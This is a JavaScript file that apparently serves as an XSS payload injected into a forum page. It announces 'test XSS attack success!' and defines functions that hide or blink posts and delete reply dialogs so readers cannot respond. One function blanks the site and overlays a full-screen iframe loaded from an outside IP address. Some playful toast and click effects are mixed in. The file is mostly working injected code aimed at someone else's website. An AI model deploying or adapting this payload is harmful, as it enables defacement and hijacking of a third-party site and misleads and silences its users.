function someFunction(){
    console.log("test XSS attack success!");
    console.log("Hi, I am @yagaoer from SCSE, BUAA~");
}

function hidePostContent(){
    document.querySelector('.post-content').style.display = 'none';
}

function showPostContent(){
    document.querySelector('.post-content').style.display = '';
}

function blinkPostContent(times){
    times = times*1000;
    setInterval(()=>{
        if (document.querySelector('.post-content').style.display !== 'none'){
            document.querySelector('.post-content').style.display = 'none';
        } else {
            document.querySelector('.post-content').style.display = '';
        }
    }, times);
}

function replaceWithUgoOnline(){
    const snackbar = document.createElement('div');
    snackbar.innerHTML = '<iframe src="http://8.152.218.70/" style="tab-index: 999;width: 100vw; height:100vh;overflow:hidden"></iframe>';
    document.querySelector("#app").style.display = 'none';
    document.querySelector("body").appendChild(snackbar);
}

const banReview = (info)=>{
    const observer = new MutationObserver((mutationsList) => {
        for (const mutation of mutationsList) {
            if (mutation.type === 'childList') {
                const replyDialog = document.querySelector('.reply-dialog');
                if (replyDialog) {
                    if (info === true) {
                        alert('本帖暂时无法回复，敬请谅解~');
                    }
                    replyDialog.remove();
                }
            }
        }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    console.log('banReview is running...');
}


const clickToast = ()=>{
    const toast = document.createElement('div');
    toast.style.position = 'fixed';
    toast.style.left = '50%';
    toast.style.top = '50%';
    toast.style.transform = 'translate(-50%, -50%)';
    toast.style.padding = '10px 20px';
    toast.style.borderRadius = '5px';
    toast.style.backgroundColor = beautifulColor[Math.floor(Math.random()*beautifulColor.length)];
    toast.style.color = 'white';
    toast.style.zIndex = '9999';
    toast.style.transition = 'opacity 1s';
    toast.textContent = toasts[Math.floor(Math.random()*toasts.length)];
    document.body.appendChild(toast);
    setTimeout(()=>{
        toast.style.opacity = 0;
    }, 1000);
    toast.addEventListener('transitionend', function() {
        toast.remove();
    });

}

const toasts = ["2025越来越好！","寒假快乐！","人生还有无限可能等你探索~","加油！"];
const beautifulColor = ["red", "green", "blue", "yellow", "purple", "orange", "pink", "cyan", "brown", "black"];


const clickWord = ()=>{
  
    function createEggElement(text) {
      const egg = document.createElement('span');
      egg.textContent = text;
      egg.style.position = 'absolute';
      egg.style.whiteSpace = 'nowrap';
      egg.style.opacity = 1;
      egg.style.transition = 'transform 2s, opacity 2s';
      return egg;
    }
  
    function handleEgg(event) {
      const egg = createEggElement(toasts[Math.floor(Math.random()*toasts.length)]);
      
      egg.style.color = beautifulColor[Math.floor(Math.random()*beautifulColor.length)];
      egg.style.left = `${event.pageX}px`;
      egg.style.top = `${event.pageY}px`;
      document.body.appendChild(egg);
  
      const offsetX = Math.random() * 200 - 100;
      const offsetY = Math.random() * 200 - 100;
      egg.style.transform = `translate(${offsetX}px,${offsetY}px)`;
      
      setTimeout(() => {
        egg.style.opacity = 0;
      }, 10);
  
      egg.addEventListener('transitionend', function() {
        egg.remove();
      });
    }
  
    document.addEventListener('click', handleEgg);
}

const begToUUQ = ()=>{
    
};


someFunction();
//hidePostContent();